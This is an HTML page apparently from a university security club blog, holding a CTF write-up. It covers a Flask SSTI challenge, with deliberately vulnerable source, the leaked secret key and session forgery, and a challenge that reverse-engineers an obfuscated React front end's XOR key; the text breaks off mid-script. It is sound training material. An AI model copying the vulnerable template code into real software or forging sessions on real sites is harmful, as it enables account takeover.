<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 4.2.1">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
  <link rel="stylesheet" href="/lib/pace/pace-theme-undefined.min.css">
  <script src="/lib/pace/pace.min.js"></script>

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"wiki.w-ais.cn","root":"/","scheme":"Gemini","version":"7.7.2","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"./public/search.xml"};
  </script>

  <meta name="description" content="前言：假期就这么来了，7月份，在家也要保持学习呀！！！">
<meta property="og:type" content="article">
<meta property="og:title" content="WUST7月份内部赛wp">
<meta property="og:url" content="https://wiki.w-ais.cn/2021/01/30/s1rthree/index.html">
<meta property="og:site_name" content="WUST-AIS">
<meta property="og:description" content="前言：假期就这么来了，7月份，在家也要保持学习呀！！！">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://gitee.com/ivenwings/md_img/raw/master/img/20200719154622.png">
<meta property="og:image" content="https://gitee.com/ivenwings/md_img/raw/master/img/20200719154638.png">
<meta property="og:image" content="https://gitee.com/ivenwings/md_img/raw/master/img/20200719154714.png">
<meta property="og:image" content="https://gitee.com/ivenwings/md_img/raw/master/img/20200719155353.png">
<meta property="og:image" content="https://gitee.com/ivenwings/md_img/raw/master/img/20200719155431.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/20200719130900918.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/20200719131106713.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyNDM2MTc2,size_16,color_FFFFFF,t_70">
<meta property="og:image" content="https://img-blog.csdnimg.cn/20200719131217560.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/20200719131433492.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyNDM2MTc2,size_16,color_FFFFFF,t_70">
<meta property="og:image" content="https://img-blog.csdnimg.cn/20200719131649250.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/20200719131933205.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyNDM2MTc2,size_16,color_FFFFFF,t_70">
<meta property="og:image" content="https://img-blog.csdnimg.cn/20200719132505636.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyNDM2MTc2,size_16,color_FFFFFF,t_70">
<meta property="og:image" content="https://img-blog.csdnimg.cn/20200719132558739.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/20200719132707283.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/20200719133534600.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyNDM2MTc2,size_16,color_FFFFFF,t_70">
<meta property="og:image" content="https://img-blog.csdnimg.cn/20200719134017947.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyNDM2MTc2,size_16,color_FFFFFF,t_70">
<meta property="og:image" content="https://img-blog.csdnimg.cn/20200719134204334.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyNDM2MTc2,size_16,color_FFFFFF,t_70">
<meta property="og:image" content="https://img-blog.csdnimg.cn/20200719134314617.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/20200719135148527.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/20200719135532935.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyNDM2MTc2,size_16,color_FFFFFF,t_70">
<meta property="og:image" content="https://img-blog.csdnimg.cn/20200719135645554.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyNDM2MTc2,size_16,color_FFFFFF,t_70">
<meta property="og:image" content="https://img-blog.csdnimg.cn/20200719135800951.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyNDM2MTc2,size_16,color_FFFFFF,t_70">
<meta property="og:image" content="https://img-blog.csdnimg.cn/20200719140017886.png">
<meta property="og:image" content="https://s1.ax1x.com/2020/07/20/U4w2OP.png">
<meta property="og:image" content="https://s1.ax1x.com/2020/07/20/U4w5Fg.png">
<meta property="og:image" content="https://s1.ax1x.com/2020/07/20/U4wfw8.png">
<meta property="og:image" content="https://s1.ax1x.com/2020/07/20/U4whTS.png">
<meta property="og:image" content="https://s1.ax1x.com/2020/07/20/U4wWef.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/20200719180752219.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/20200719181608918.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTg4MzIyMw==,size_16,color_FFFFFF,t_70">
<meta property="og:image" content="https://s1.ax1x.com/2020/07/20/U4wIYQ.png">
<meta property="og:image" content="https://s1.ax1x.com/2020/07/20/U4woWj.png">
<meta property="og:image" content="https://s1.ax1x.com/2020/07/20/U4wHln.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/20200719191002377.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/20200719191930322.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTg4MzIyMw==,size_16,color_FFFFFF,t_70">
<meta property="og:image" content="https://img-blog.csdnimg.cn/2020071919195647.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/20200719193036278.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTg4MzIyMw==,size_16,color_FFFFFF,t_70">
<meta property="og:image" content="https://img-blog.csdnimg.cn/20200719193341909.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/20200719193401535.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/20200719193621879.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTg4MzIyMw==,size_16,color_FFFFFF,t_70">
<meta property="og:image" content="https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/%E5%8D%8F%E4%BC%9A%E8%AE%AD%E7%BB%83%E8%B5%9B-3-1.png">
<meta property="og:image" content="https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/%E5%8D%8F%E4%BC%9A%E8%AE%AD%E7%BB%83%E8%B5%9B-3-2.png">
<meta property="og:image" content="https://s1.ax1x.com/2020/07/20/U4wxkF.gif">
<meta property="og:image" content="https://img-blog.csdnimg.cn/20200719170641702.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTg4MzIyMw==,size_16,color_FFFFFF,t_70">
<meta property="og:image" content="https://s1.ax1x.com/2020/07/20/U4wqO0.png">
<meta property="og:image" content="https://s1.ax1x.com/2020/07/20/U4wXwT.png">
<meta property="article:published_time" content="2021-01-30T08:34:15.486Z">
<meta property="article:modified_time" content="2020-07-20T12:30:52.961Z">
<meta property="article:author" content="WUST-AIS">
<meta property="article:tag" content="CTF">
<meta property="article:tag" content="Web">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://gitee.com/ivenwings/md_img/raw/master/img/20200719154622.png">

<link rel="canonical" href="https://wiki.w-ais.cn/2021/01/30/s1rthree/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true
  };
</script>

  <title>WUST7月份内部赛wp | WUST-AIS</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <div>
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">WUST-AIS</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>


<nav class="site-nav">
  
  <ul id="menu" class="menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>Home</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>About</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>Tags</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>Categories</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>Archives</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
        </a>
      </li>
  </ul>

</nav>
  <div class="site-search">
    <div class="popup search-popup">
    <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocorrect="off" autocapitalize="off"
           placeholder="Searching..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result"></div>

</div>
<div class="search-pop-overlay"></div>

  </div>
</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content">
            

  <div class="posts-expand">
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="en">
    <link itemprop="mainEntityOfPage" href="https://wiki.w-ais.cn/2021/01/30/s1rthree/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/uploads/logo.png">
      <meta itemprop="name" content="WUST-AIS">
      <meta itemprop="description" content="Join us">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="WUST-AIS">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          WUST7月份内部赛wp
        </h1>

        <div class="post-meta">
           
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2021-01-30 16:34:15" itemprop="dateCreated datePublished" datetime="2021-01-30T16:34:15+08:00">2021-01-30</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2020-07-20 20:30:52" itemprop="dateModified" datetime="2020-07-20T20:30:52+08:00">2020-07-20</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <p>前言：假期就这么来了，7月份，在家也要保持学习呀！！！</p>
<a id="more"></a>

<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Login-as-admin"><a href="#Login-as-admin" class="headerlink" title="Login as admin"></a>Login as admin</h3><p>题目改编自 <code>Zer0pts CTF 2020</code>，此题是无敌简化版，考点是 <code>SSTi</code> 和 <code>flask的session伪造</code></p>
<p>首先源码已经给出来了，分析一波源码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag <span class="comment"># 导入 flag</span></span><br><span class="line"><span class="keyword">from</span> key <span class="keyword">import</span> key <span class="comment"># 导入 key</span></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line">app.secret_key = key <span class="comment"># secret_key等于导入的key</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route("/")</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">	flask.session[<span class="string">'user'</span>] = <span class="string">'guest'</span></span><br><span class="line">	<span class="keyword">return</span> <span class="string">"Please login as admin"</span></span><br><span class="line"><span class="comment"># 先给用户一个session，身份为user=guest，并告诉用户要以admin登陆</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route("/admin")</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">admin</span><span class="params">()</span>:</span></span><br><span class="line">	<span class="keyword">if</span> flask.session[<span class="string">'user'</span>] == <span class="string">'admin'</span>:</span><br><span class="line">		<span class="keyword">return</span> str(flag)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="keyword">return</span> <span class="string">"Please login as admin"</span></span><br><span class="line"><span class="comment"># 当user=admin时，就返回flag</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.errorhandler(404)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">page_not_found</span><span class="params">(error)</span>:</span></span><br><span class="line">    referrer = flask.request.headers.get(<span class="string">"referer"</span>)</span><br><span class="line">    <span class="keyword">if</span> referrer <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    	referrer = <span class="string">'/'</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> valid_url(referrer):</span><br><span class="line">    	referrer = <span class="string">'/'</span></span><br><span class="line">  <span class="comment"># 漏洞点</span></span><br><span class="line">  <span class="comment"># referer可控，但是限制了长度。所以利用这里的SSTI可以读取一些配置，但是不能直接RCE。</span></span><br><span class="line">    html = <span class="string">'&lt;html&gt;&lt;head&gt;&lt;meta http-equiv="Refresh" content="3;URL=&#123;&#125;"&gt;&lt;title&gt;404 Not Found&lt;/title&gt;&lt;/head&gt;&lt;body&gt;Page not found. Redirecting...&lt;/body&gt;&lt;/html&gt;'</span>.format(referrer)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> flask.render_template_string(html), <span class="number">404</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 对referer限制长度，无法读文件和RCE，但是可以通过读配置来读取secret_key</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">valid_url</span><span class="params">(url)</span>:</span></span><br><span class="line">    <span class="string">""" Check if given url is valid """</span></span><br><span class="line">    host = flask.request.host_url</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> url.startswith(host):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span>  <span class="comment"># Not from my server</span></span><br><span class="line">    <span class="keyword">if</span> len(url) - len(host) &gt; <span class="number">16</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span>  <span class="comment"># Referer may be also 404</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(</span><br><span class="line">        host=<span class="string">'0.0.0.0'</span>,</span><br><span class="line">        port=<span class="string">'8000'</span>,</span><br><span class="line">        debug=<span class="literal">False</span></span><br><span class="line">    )</span><br></pre></td></tr></table></figure>

<p>构造 <code>Referer:http://47.110.130.169:12222/</code>，然后需要触发404，地址栏随便输入一个不存在的页面：</p>
<p><img src="https://gitee.com/ivenwings/md_img/raw/master/img/20200719154622.png" alt="image-20200719154614770"></p>
<p>访问后可以发现触发到了</p>
<p><img src="https://gitee.com/ivenwings/md_img/raw/master/img/20200719154638.png" alt="image-20200719154638083"></p>
<p>然后可以发现地址栏多了一堆配置，拿去url解码一下，就可以看到完整的配置了。</p>
<p><img src="https://gitee.com/ivenwings/md_img/raw/master/img/20200719154714.png" alt="image-20200719154714804"></p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;Config &#123;'ENV': 'production', 'DEBUG': False, 'TESTING': False, 'PROPAGATE_EXCEPTIONS': None, 'PRESERVE_CONTEXT_ON_EXCEPTION': None, 'SECRET_KEY': 'wustaismatr1x2333333333333333333333333333', 'PERMANENT_SESSION_LIFETIME': datetime.timedelta(days=31), 'USE_X_SENDFILE': False, 'SERVER_NAME': None, 'APPLICATION_ROOT': '/', 'SESSION_COOKIE_NAME': 'session', 'SESSION_COOKIE_DOMAIN': False, 'SESSION_COOKIE_PATH': None, 'SESSION_COOKIE_HTTPONLY': True, 'SESSION_COOKIE_SECURE': False, 'SESSION_COOKIE_SAMESITE': None, 'SESSION_REFRESH_EACH_REQUEST': True, 'MAX_CONTENT_LENGTH': None, 'SEND_FILE_MAX_AGE_DEFAULT': datetime.timedelta(seconds=43200), 'TRAP_BAD_REQUEST_ERRORS': None, 'TRAP_HTTP_EXCEPTIONS': False, 'EXPLAIN_TEMPLATE_LOADING': False, 'PREFERRED_URL_SCHEME': 'http', 'JSON_AS_ASCII': True, 'JSON_SORT_KEYS': True, 'JSONIFY_PRETTYPRINT_REGULAR': False, 'JSONIFY_MIMETYPE': 'application/json', 'TEMPLATES_AUTO_RELOAD': None, 'MAX_COOKIE_SIZE': 4093&#125;&gt;</span><br></pre></td></tr></table></figure>

<p>可以得到 <code>&#39;SECRET_KEY&#39;: &#39;wustaismatr1x2333333333333333333333333333&#39;</code></p>
<p>于是我们可以利用key来伪造session：<code>{&quot;user&quot;:&quot;admin&quot;}</code></p>
<p>可以自己开一个flask项目，可以直接用工具：<a href="https://github.com/noraj/flask-session-cookie-manager" target="_blank" rel="noopener">Github项目链接</a> </p>
<p><img src="https://gitee.com/ivenwings/md_img/raw/master/img/20200719155353.png" alt="image-20200719155352985"></p>
<p>得到session后放在cookie里，访问 <code>/admin</code></p>
<p><img src="https://gitee.com/ivenwings/md_img/raw/master/img/20200719155431.png" alt="image-20200719155431529"></p>
<p>真·签到题</p>
<h3 id="大人，时代变了"><a href="#大人，时代变了" class="headerlink" title="大人，时代变了"></a>大人，时代变了</h3><h4 id="0x0-前言"><a href="#0x0-前言" class="headerlink" title="0x0 前言"></a>0x0 前言</h4><p>出这个题的本意是看到CTF的web题老是PHP什么的, 感觉和现实情况有点脱节, 且对前端审计没有太大的要求, 于是出了这个”现代”一点的题. 这个题目模拟的是爬虫, 在多次请求后将会出现验证码, 再频繁访问将会封锁ip, 且网站是使用React写的, 经过webpack的打包和混淆使得js很难读, 不过这也是大势所趋, 出出来涨涨见识吧.</p>
<h4 id="0x1-前端审计"><a href="#0x1-前端审计" class="headerlink" title="0x1 前端审计"></a>0x1 前端审计</h4><p>首先打开网站, hint提示用户识别码只有3位<br><img src="https://img-blog.csdnimg.cn/20200719130900918.png" alt="在这里插入图片描述"></p>
<h5 id="抓包"><a href="#抓包" class="headerlink" title="抓包"></a>抓包</h5><p>F12进行抓包, 发现有<code>uuid</code>和<code>img</code>两个字段, img毫无疑问是验证码了, uuid确是一个base64, 尝试解码, 无法得到数据<br><img src="https://img-blog.csdnimg.cn/20200719131106713.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyNDM2MTc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>尝试构造随意数据发送, 再在F12里查看, 发现请求中uuid为<code>f56d359611c24abf9aa1d9f0113091a4</code>, 说明前端对此数据进行了解密, 首先对前端代码进行审计, 查找加密算法<br><img src="https://img-blog.csdnimg.cn/20200719131217560.png" alt="在这里插入图片描述"></p>
<h5 id="逻辑分析"><a href="#逻辑分析" class="headerlink" title="逻辑分析"></a>逻辑分析</h5><p>打开前端代码后, 我相信不少人肯定是蒙的, 首先先进行格式化, 其大概画风是这样的<br><img src="https://img-blog.csdnimg.cn/20200719131433492.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyNDM2MTc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>让我们一步一步来, 首先看点击登录后发生了什么, 搜索关键词<code>登录</code>, 可以找到这里<br><img src="https://img-blog.csdnimg.cn/20200719131649250.png" alt="在这里插入图片描述"><br>可以看见登录按钮绑定了一个函数<code>this.w</code>, 进入<em>this.w</em>看干什么了</p>
<p><img src="https://img-blog.csdnimg.cn/20200719131933205.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyNDM2MTc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">分析: 这里的switch其实是一个<code>async</code>函数, 通过<code>babel</code>进行转义的结果, <em>建议学习ES6, 7, 8</em>, 勉强可以进行分析</p>
<ol>
<li>进入case0, 将<code>state.l = true</code>, 然后调用<code>a.__.q(state.w, state.c, state.p)</code></li>
<li>进入case4, <code>alert(t.msg)</code> 可以发现这里就是弹出服务器错误提示的地方</li>
<li>进入case9, <code>t0 = _.catch(0), alert(t0)</code>, 这里是处理错误的地方</li>
<li>进入case12, 调用<code>a.u()</code>, 然后<code>state.l = false</code></li>
</ol>
<p>进入<code>a.__.q(e, t, a)</code>, 应该有三个参数, 分析逻辑<br><img src="https://img-blog.csdnimg.cn/20200719132505636.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyNDM2MTc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>一眼看到熟悉的200, 说明这里应该就是发送数据的地方, 查看参数<br><img src="https://img-blog.csdnimg.cn/20200719132558739.png" alt="在这里插入图片描述"><br> 在这里我们发现大量<code>w({Base64})</code>的东西, 通过定位发现w为Base64解码, 吧base64拿去解码, 发现为发送数据的隐藏, 比如<code>uuid</code>, <code>code</code>. 这种方式很常见, 为了防止直接搜索直接对数据进行base64储存<br> <img src="https://img-blog.csdnimg.cn/20200719132707283.png" alt="在这里插入图片描述"><br> 查看参数, 这么一长串为<br> <code>Object(F_Web_Project_fucking_test_node_modules_babel_preset_react_app_node_modules_babel_runtime_helpers_esm_defineProperty__WEBPACK_IMPORTED_MODULE_6__.a)(l, w(&quot;bWV0aG9k&quot;), w(&quot;UE9TVA==&quot;))</code><br>前面那么一长串其实是命名空间, 经过化简后可以得到<br><code>{method: &quot;POST&quot;}</code>, 发现为fetch的用法, 但是在这里并没有发现加密, 说明加密不在发送数据的时候</p>
<p>再次观察请求, 发现在进行一次POST后, 立马获取了一个新的uuid, 说明在登录后应该调用了获取新的uuid的函数, 经过上面分析<code>async</code>, 进入<code>a.u()</code></p>
<p><img src="https://img-blog.csdnimg.cn/20200719133534600.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyNDM2MTc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h5 id="解密算法"><a href="#解密算法" class="headerlink" title="解密算法"></a>解密算法</h5><p>又是一个类似的函数, 这里我们可以直接聚焦到可疑函数<code>a.setState({g: e.img, p: a.__.p(e[t(&quot;dXVpZA==&quot;)])})</code>, 可以看到验证码被保存了, 而<code>dXVpZA==</code>就是uuid, 说明uuid经过了<code>a.__p() e[] t()</code> 的处理, 一个个跟踪</p>
<ol>
<li>首先发现t为Base64解码函数, 现在为<code>a.__.p(e[&#39;uuid&#39;])</code></li>
<li>可以知道e为返回数据, 那么解码就在<code>a.__.p()</code>里</li>
<li>进入p, 首先对uuid进行<code>Base64.toUnit8Array</code>, 然后与<code>___</code>进行遍历<br><img src="https://img-blog.csdnimg.cn/20200719134017947.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyNDM2MTc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li>
<li>寻找<code>___</code>, 发现为<code>___ = new Uint8Array([49, 50, 51, 67, 55, 69, 53, 69, 56, 55, 53, 70, 66, 70, 48, 69, 69, 69, 50, 53, 56, 51, 70, 56, 65, 70, 51, 68, 68, 70, 70, 57])</code> 可以拼出内容<br><img src="https://img-blog.csdnimg.cn/20200719134204334.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyNDM2MTc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li>
<li>追踪<code>__</code>, 发现为xor<br><img src="https://img-blog.csdnimg.cn/20200719134314617.png" alt="在这里插入图片描述"></li>
<li>那么整个算法就清晰了, 使用python进行模拟</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parse_uuid</span><span class="params">(raw)</span>:</span></span><br><span class="line">    input_raw = list(base64.b64decode(raw))</span><br><span class="line">    key = [<span class="number">49</span>, <span class="number">50</span>, <span class="number">51</span>, <span class="number">67</span>, <span class="number">55</span>, <span class="number">69</span>, <span class="number">53</span>, <span class="number">69</span>, <span class="number">56</span>, <span class="number">55</span>, <span 